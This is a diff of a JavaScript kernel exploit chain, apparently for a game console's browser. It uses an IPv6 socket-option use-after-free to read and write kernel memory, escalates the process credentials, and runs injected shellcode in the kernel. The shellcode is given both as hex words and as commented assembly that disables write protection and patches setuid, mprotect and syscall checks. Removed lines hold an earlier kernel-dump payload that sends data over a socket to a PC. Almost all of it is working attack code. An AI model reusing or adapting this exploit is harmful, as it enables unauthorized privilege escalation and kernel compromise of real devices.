+      chain.push_write8(pktinfo_buffer, address);
+      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
+      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
+      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
+      chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, pktinfo_buffer_len);
+      chain.push_write8(pktinfo_buffer, value);
+      chain.fcall(syscalls[105], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
+    }
+    chain.run();
+  }
 
-//kernel dumper payload | generic
-/*
-exec_writer[0] = 0xAAAABF48;
-exec_writer[1] = 0xAAAAAAAA;
-exec_writer[2] = 0xC748AAAA;
-exec_writer[3] = 0x00000007;
-exec_writer[4] = 0xAABF4800;
-exec_writer[5] = 0xAAAAAAAA;
-exec_writer[6] = 0x48AAAAAA;
-exec_writer[7] = 0x000007C7;
-exec_writer[8] = 0xBF480000;
-exec_writer[9] = 0xAAAAAAAA;
-exec_writer[10] = 0xAAAAAAAA;
-exec_writer[11] = 0x0007C748;
-exec_writer[12] = 0x48000000;
-exec_writer[13] = 0xAAAAAABF;
-exec_writer[14] = 0xAAAAAAAA;
-exec_writer[15] = 0xAABE48AA;
-exec_writer[16] = 0xAAAAAAAA;
-exec_writer[17] = 0x48AAAAAA;
-exec_writer[18] = 0x83483789;
-exec_writer[19] = 0x8B4810EC;
-exec_writer[20] = 0x009DE83E;
-exec_writer[21] = 0x89480000;
-exec_writer[22] = 0x89482404;
-exec_writer[23] = 0x00C1E8C7;
-exec_writer[24] = 0x8B480000;
-exec_writer[25] = 0xBE48243C;
-exec_writer[26] = 0xAAAAAAAA;
-exec_writer[27] = 0xAAAAAAAA;
-exec_writer[28] = 0xE8C28948;
-exec_writer[29] = 0x0000000F;
-exec_writer[30] = 0x10C48348;
-exec_writer[31] = 0x8080B848;
-exec_writer[32] = 0x80808080;
-exec_writer[33] = 0x49C38080;
-exec_writer[34] = 0x8948D089;
-exec_writer[35] = 0xE8C149D1;
-exec_writer[36] = 0x495F7403;
-exec_writer[37] = 0x48FF408D;
-exec_writer[38] = 0x7603F883;
-exec_writer[39] = 0x478D483E;
-exec_writer[40] = 0xC6394808;
-exec_writer[41] = 0xC1483574;
-exec_writer[42] = 0x834804EA;
-exec_writer[43] = 0xC031F0E1;
-exec_writer[44] = 0x046F0FF3;
-exec_writer[45] = 0x04110F07;
-exec_writer[46] = 0xC0834806;
-exec_writer[47] = 0xC8394810;
-exec_writer[48] = 0x8D48EE75;
-exec_writer[49] = 0x39491204;
-exec_writer[50] = 0x482774C0;
-exec_writer[51] = 0xC148D089;
-exec_writer[52] = 0x8B4804E0;
-exec_writer[53] = 0x89480714;
-exec_writer[54] = 0x49C30614;
-exec_writer[55] = 0x3103E0C1;
-exec_writer[56] = 0x148B48C0;
-exec_writer[57] = 0x14894807;
-exec_writer[58] = 0xC0834806;
-exec_writer[59] = 0xC0394908;
-exec_writer[60] = 0x48C3EF75;
-exec_writer[61] = 0x4C457FBA;
-exec_writer[62] = 0x01010246;
-exec_writer[63] = 0xF8894809;
-exec_writer[64] = 0x00002548;
-exec_writer[65] = 0x3948FFFC;
-exec_writer[66] = 0x480B7410;
-exec_writer[67] = 0x0040002D;
-exec_writer[68] = 0x10394800;
-exec_writer[69] = 0x48C3F575;
-exec_writer[70] = 0xFF3E448D;
-exec_writer[71] = 0x48DEF748;
-exec_writer[72] = 0x0FC3F021;
-exec_writer[73] = 0x493857B7;
-exec_writer[74] = 0x8566F989;
-exec_writer[75] = 0x485F74D2;
-exec_writer[76] = 0x8D20478B;
-exec_writer[77] = 0xF631FF4A;
-exec_writer[78] = 0xCD148D48;
-exec_writer[79] = 0x00000000;
-exec_writer[80] = 0x48F80148;
-exec_writer[81] = 0x8D48CA29;
-exec_writer[82] = 0x8D4C3848;
-exec_writer[83] = 0x04EBD104;
-exec_writer[84] = 0x38C18348;
-exec_writer[85] = 0x30508B48;
-exec_writer[86] = 0x10788B48;
-exec_writer[87] = 0x28408B48;
-exec_writer[88] = 0x48D70148;
-exec_writer[89] = 0x8D48DAF7;
-exec_writer[90] = 0x48FF0744;
-exec_writer[91] = 0x3948D021;
-exec_writer[92] = 0x420F48C6;
-exec_writer[93] = 0xC88948F0;
-exec_writer[94] = 0x75C83949;
-exec_writer[95] = 0xCE294CD3;
-exec_writer[96] = 0xFF868D48;
-exec_writer[97] = 0x4800003F;
-exec_writer[98] = 0xFFC00025;
-exec_writer[99] = 0xF631C3FF;
-exec_writer[100] = 0xB70FEBEB;
-exec_writer[101] = 0x85663846;
-exec_writer[102] = 0x835274C0;
-exec_writer[103] = 0x034801E8;
-exec_writer[104] = 0x8D482076;
-exec_writer[105] = 0x0000C514;
-exec_writer[106] = 0x29480000;
-exec_writer[107] = 0x468D48C2;
-exec_writer[108] = 0x0C8D4838;
-exec_writer[109] = 0x481FEBD0;
-exec_writer[110] = 0x4810568B;
-exec_writer[111] = 0x8948FA29;
-exec_writer[112] = 0x8B480856;
-exec_writer[113] = 0x89482856;
-exec_writer[114] = 0x89482056;
-exec_writer[115] = 0xC13948C6;
-exec_writer[116] = 0x83481C74;
-exec_writer[117] = 0x834838C0;
-exec_writer[118] = 0x7500087E;
-exec_writer[119] = 0x568B48DA;
-exec_writer[120] = 0x56894828;
-exec_writer[121] = 0xC6894820;
-exec_writer[122] = 0x75C13948;
-exec_writer[123] = 0x90C3C3E5;
+  function brute_force_kernel_map() {
+    var attempt = new int64(((leaked_pktopts_address.low & 0xFE000000) + VM_MAP_PMAP_OFFSET), leaked_pktopts_address.hi);
+    for (var i = 0; i < 0xC0; i++) {
+      var kernel_pmap_store = kernel_read8(attempt);
+      if (kernel_pmap_store.hi == 0xFFFFFFFF && ((kernel_pmap_store.low & 0x3FFF) == (KERNEL_PMAP_STORE_OFFSET & 0x3FFF))) {
+        kernel_base = kernel_pmap_store.sub32(KERNEL_PMAP_STORE_OFFSET);
+        if ((kernel_base.low & 0x3FFF) == 0x0) {
+          return;
+        }
+      }
+      attempt.sub32inplace(0x01000000);
+    }
+    alert("[ERROR] failed to find kernel_map");
+    while (1) {};
+  }
 
-p.write8(write_address.add32(0x2), this_master_sock_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
-p.write8(write_address.add32(0x13), this_overlapped_socket_pktopts_address.add32(PKTOPTS_RTHDR_OFFSET));
-p.write8(write_address.add32(0x24), pktopts_leak_addr.add32(PKTOPTS_PKTINFO_OFFSET));
-p.write8(write_address.add32(0x35), knote_kn.add32(0x8));
-p.write8(write_address.add32(0x3F), socketops_ptr);
-p.write8(write_address.add32(0x68), userland_buffer);
+  function find_proc() {
+    var proc = kernel_read8(kernel_base.add32(KERNEL_ALLPROC_OFFSET));
+    while (proc.low != 0) {
+      var pid = kernel_read8(proc.add32(PROC_PID_OFFSET));
+      if (pid.low == this_pid) {
+        return proc;
+      }
+      proc = kernel_read8(proc);
+    }
+    alert("[ERROR] failed to find proc");
+    while (1) {};
+  }
 
-  p.write8(fake_sockopts.add32(0x18), exec_address);
-  alert("kernel payload");
-  p.syscall(54, kevent_sock, 0x20001111, 0);
-  alert("survived kernel hell, all is ok? 0x" + p.read8(errno_location)); //0x80808080
+  function find_execution_socket() {
 
+    var filedesc = kernel_read8(proc.add32(PROC_FILEDESC_OFFSET));
+    var ofiles = kernel_read8(filedesc);
+    target_file = kernel_read8(ofiles.add32(0x8 * target_socket))
+    socketops = kernel_read8(target_file.add32(FILE_FOPS_OFFSET));
+  }
+  //lower priority
+  p.write4(prio, 0x1FF);
+  chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);
+  //find uaf
+  find_socket_overlap();
+  //play with uaf
+  fake_pktopts(0);
+  leak_sockets[overlapped_socket_idx] = spare_socket;
+  //leak shit
+  leak_pktopts();
+  fake_pktopts(leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
+  //find vvictim
+  find_slave();
+  brute_force_kernel_map();
+  const proc = find_proc();
+  const proc_ucred = kernel_read8(proc.add32(PROC_UCRED_OFFSET));
+  kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF));
 
-//
-//  buffer -> socket -> pc (port 9011)
-//
-exec_writer[0] = 0x0210B848;
-exec_writer[1] = 0xA8C03323;//low word port | hi word ip
-exec_writer[2] = 0x5541E201;// low word ip
-exec_writer[3] = 0x5441D231;
-exec_writer[4] = 0xDDDDBC49;
-exec_writer[5] = 0xDDDDDDDD;
-exec_writer[6] = 0x4855DDDD;
-exec_writer[7] = 0x02BFFD89;
-exec_writer[8] = 0x53000000;
-exec_writer[9] = 0xBEF38948;
-exec_writer[10] = 0x00000001;
-exec_writer[11] = 0x28EC8348;
-exec_writer[12] = 0x24448948;
-exec_writer[13] = 0xAAB84810;
-exec_writer[14] = 0xAAAAAAAA;
-exec_writer[15] = 0xC7AAAAAA;
-exec_writer[16] = 0x010C2444;
-exec_writer[17] = 0x48000000;
-exec_writer[18] = 0x182444C7;
-exec_writer[19] = 0x00000000;
-exec_writer[20] = 0x10BAD0FF;
-exec_writer[21] = 0x48000000;
-exec_writer[22] = 0x1024748D;
-exec_writer[23] = 0x89C58941;
-exec_writer[24] = 0xBBB848C7;
-exec_writer[25] = 0xBBBBBBBB;
-exec_writer[26] = 0xFFBBBBBB;
-exec_writer[27] = 0x04B841D0;
-exec_writer[28] = 0x48000000;
-exec_writer[29] = 0x0C244C8D;
-exec_writer[30] = 0xBAEF8944;
-exec_writer[31] = 0x00000001;
-exec_writer[32] = 0x000006BE;
-exec_writer[33] = 0xCCB84800;
-exec_writer[34] = 0xCCCCCCCC;
-exec_writer[35] = 0xFFCCCCCC;
-exec_writer[36] = 0xDB8548D0;
-exec_writer[37] = 0xDA892374;
-exec_writer[38] = 0xFFFB8148;
-exec_writer[39] = 0x7600000F;
-exec_writer[40] = 0x1000BA05;
-exec_writer[41] = 0x89480000;
-exec_writer[42] = 0xEF8944EE;
-exec_writer[43] = 0x48D4FF41;
-exec_writer[44] = 0xC5014898;
-exec_writer[45] = 0x75C32948;
-exec_writer[46] = 0xEEB848DD;
-exec_writer[47] = 0xEEEEEEEE;
-exec_writer[48] = 0x44EEEEEE;
-exec_writer[49] = 0xD0FFEF89;
-exec_writer[50] = 0x28C48348;
-exec_writer[51] = 0x5D5BC031;
-exec_writer[52] = 0x5D415C41;
-exec_writer[53] = 0x909090C3;
+  find_execution_socket();
+  var exec_handle = chain.syscall(533, 0, 0x100000, 7);
+  var write_handle = chain.syscall(534, exec_handle, 3);
+  var write_address = chain.syscall(477, new int64(0x91000000, 0x9), 0x100000, 3, 17, write_handle, 0);
+  var exec_address = chain.syscall(477, new int64(0x90000000, 0x9), 0x100000, 0x5, 1, exec_handle, 0)
+  chain.syscall(324, 1);
+  if(exec_address.low != 0x90000000) {
+      alert("[ERROR] failed to allocate jit memory");
+      while(1){};
+  }
+  var exec_writer = p.array_from_address(write_address, 0x4000);
+  for(var i = 0; i < 0x200; i++) {
+      exec_writer[i] = 0x90909090;
+  }
+  exec_writer[0x200] = 0x37C0C748;
+  exec_writer[0x201] = 0xC3000013;
+  if(chain.call(exec_address).low != 0x1337) {
+      alert("[ERROR] hmm weird");
+      while(1){};
+  }
 
-p.write8(write_address.add32(0x12), window.syscalls[4]);
-p.write8(write_address.add32(0xEA), window.syscalls[6]);
-p.write8(write_address.add32(0x37), window.syscalls[97]);
-p.write8(write_address.add32(0x63), window.syscalls[98]);
-p.write8(write_address.add32(0x87), window.syscalls[105]);
+  exec_writer[0] = 0x54415355;
+  exec_writer[1] = 0x1111BB48;
+  exec_writer[2] = 0x11111111;
+  exec_writer[3] = 0xBD481111;
+  exec_writer[4] = 0x22222222;
+  exec_writer[5] = 0x22222222;
+  exec_writer[6] = 0xBFE4314D;
+  exec_writer[7] = 0x000000C0;
+  exec_writer[8] = 0xBADE8948;
+  exec_writer[9] = 0x00000002;
+  exec_writer[10] = 0x8349D5FF;
+  exec_writer[11] = 0x814901C4;
+  exec_writer[12] = 0x000500FC;
+  exec_writer[13] = 0x41E47500;
+  exec_writer[14] = 0x655D5B5C;
+  exec_writer[15] = 0x25048B48;
+  exec_writer[16] = 0x00000000;
+  exec_writer[17] = 0x08408B48;
+  exec_writer[18] = 0x48408B48;
+  exec_writer[19] = 0x48008B48;
+  exec_writer[20] = 0x333333B9;
+  exec_writer[21] = 0x33333333;
+  exec_writer[22] = 0xC7C74833;
+  exec_writer[23] = 0x000002BE; // num sockets
+  exec_writer[24] = 0x48F63148;
+  exec_writer[25] = 0x117DFE39;
+  exec_writer[26] = 0x48B1148B;
+  exec_writer[27] = 0x00D004C7;
+  exec_writer[28] = 0x48000000;
+  exec_writer[29] = 0xEB01C683;
+  exec_writer[30] = 0x44BF48EA;
+  exec_writer[31] = 0x44444444;
+  exec_writer[32] = 0x48444444;
+  exec_writer[33] = 0x555555BE;
+  exec_writer[34] = 0x55555555;
+  exec_writer[35] = 0x37894855;
+  exec_writer[36] = 0x6666BF48;
+  exec_writer[37] = 0x66666666;
+  exec_writer[38] = 0x200F6666;
+  exec_writer[39] = 0xFF2548C0;
+  exec_writer[40] = 0x0FFFFEFF;
+  exec_writer[41] = 0x87C6C022;
+  exec_writer[42] = 0x0077F860;
+  exec_writer[43] = 0x90BE48C3;
+  exec_writer[44] = 0x90909090;
+  exec_writer[45] = 0x488B4990;
+  exec_writer[46] = 0xEE98B789;
+  exec_writer[47] = 0x87C70002;
+  exec_writer[48] = 0x000107C2;
+  exec_writer[49] = 0x000000B8;
+  exec_writer[50] = 0x049087C7;
+  exec_writer[51] = 0x00000000;
+  exec_writer[52] = 0xC7660000;
+  exec_writer[53] = 0x0004B987;
+  exec_writer[54] = 0x66909000;
+  exec_writer[55] = 0x04BD87C7;
+  exec_writer[56] = 0x90900000;
+  exec_writer[57] = 0xC687C766;
+  exec_writer[58] = 0x90000004;
+  exec_writer[59] = 0xD987C6E9;
+  exec_writer[60] = 0x37003C25;
+  exec_writer[61] = 0x25DC87C6;
+  exec_writer[62] = 0x6637003C;
+  exec_writer[63] = 0x390A87C7;
+  exec_writer[64] = 0xE9900006;
+  exec_writer[65] = 0x013087C7;
+  exec_writer[66] = 0x31480040;
+  exec_writer[67] = 0xC748C3C0;
+  exec_writer[68] = 0x115ED087;
+  exec_writer[69] = 0x00000201;
+  exec_writer[70] = 0xB78D4800;
+  exec_writer[71] = 0x0000AF8C;
+  exec_writer[72] = 0xD8B78948;
+  exec_writer[73] = 0xC701115E;
+  exec_writer[74] = 0x115EF887;
+  exec_writer[75] = 0x00000101;
+  exec_writer[76] = 0x000D4800;
+  exec_writer[77] = 0x0F000100;
+  exec_writer[78] = 0xB848C022;
+  exec_writer[79] = 0x80808080;
+  exec_writer[80] = 0x80808080;
+  exec_writer[81] = 0x909090C3;
 
-alert("calling the thing");
-p.fcall(exec_address, userland_buffer, 0x4A00000);
-alert("made it out alive");
-alert("done");
-  //p.syscall(325);
-*/
+  p.write8(write_address.add32(0x6), kernel_base.add32(KERNEL_M_IP6OPT_OFFSET));
+  p.write8(write_address.add32(0x10), kernel_base.add32(KERNEL_MALLOC_OFFSET));
+  p.write8(write_address.add32(0x51), fix_these_sockets_ptr);
 
-  //alert("test - close browser");
-  p.write8(0, 0); //kill browser
-  while (true) {}
+  p.write8(write_address.add32(0x7B), target_file.add32(FILE_FOPS_OFFSET));
+  p.write8(write_address.add32(0x85), socketops);
+  p.write8(write_address.add32(0x92), kernel_base);
 
+  p.write8(fake_socketops.add32(FILEOPS_IOCTL_OFFSET), exec_address);
+  kernel_write8(target_file.add32(FILE_FOPS_OFFSET), fake_socketops);
+  chain.syscall(54, target_socket, 0x20001111, 0);
+  p.write8(0, 0);
 }
+
+/*
+    - assemble & take every 4 bytes, byteswap and assign them to exec_writer
+    - overwrite dynamic stuff after
+*/
+/*
+//spam malloc, this should not be required anymore
+push rbp
+push rbx
+push r12  
+
+mov rbx, 0x1111111111111111
+mov rbp, 0x2222222222222222
+xor r12, r12
+
+kmalloc_loop:
+	mov edi, 0xC0
+  mov rsi, rbx
+	mov edx, 2
+  call rbp
+	add r12, 0x1
+  cmp r12, 0x500
+  jne kmalloc_loop
+
+pop r12
+pop rbx
+pop rbp
+
+//kill all of our socket file*'s just in case
+//get thr pointer
+mov rax, qword ptr gs:[0x0]
+//get proc pointer
+mov rax, qword ptr [rax + 0x8]
+//get filedesc pointer
+mov rax, qword ptr [rax + 0x48]
+//get file pointer pointer
+mov rax, qword ptr [rax + 0x0]
+
+mov rcx, 0x3333333333333333
+mov rdi, 0x2BE
+xor rsi, rsi
+loop_check:
+  cmp rsi, rdi
+  jge end
+  mov edx, dword ptr [rcx + 0x4 * rsi]
+  mov qword ptr [rax + rdx * 0x8], 0x0
+  add rsi, 0x1
+  jmp loop_check
+
+end:
+
+//socketops field pointer
+mov rdi, 0x4444444444444444
+//original socketops pointer
+mov rsi, 0x5555555555555555 
+mov qword ptr [rdi], rsi
+//kernel base
+mov rdi, 0x6666666666666666 
+
+//disable wp
+mov rax, cr0
+and rax, 0xFFFFFFFFFFFEFFFF
+mov cr0, rax
+
+//crash info
+mov byte ptr [rdi + 0x77F860], 0xC3
+
+//mprotect
+mov rsi, 0x8B49909090909090
+mov qword ptr [rdi + 0x2EE98], rsi
+
+//setuid
+mov dword ptr [rdi + 0x107C2], 0xB8
+
+//syscall everywhere
+mov dword ptr [rdi + 0x490], 0x0
+mov word ptr [rdi + 0x4B9], 0x9090
+mov word ptr [rdi + 0x4BD], 0x9090
+mov word ptr [rdi + 0x4C6], 0xE990
+
+//rwx mmap
+mov byte ptr [rdi + 0x3C25D9], 0x37
+mov byte ptr [rdi + 0x3C25DC], 0x37
+
+//dlsym
+mov word ptr [rdi + 0x6390A], 0xE990
+mov dword ptr [rdi + 0x400130], 0xC3C03148
+
+//syscall 11
+mov qword ptr [rdi + 0x1115ED0], 0x2
+lea rsi, [rdi + 0xAF8C]
+mov qword ptr [rdi + 0x1115ED8], rsi
+mov dword ptr [rdi + 0x1115EF8], 0x1
+
+//enable wp
+or rax, 0x10000
+mov cr0, rax
+mov rax, 0x8080808080808080
+ret
+*/
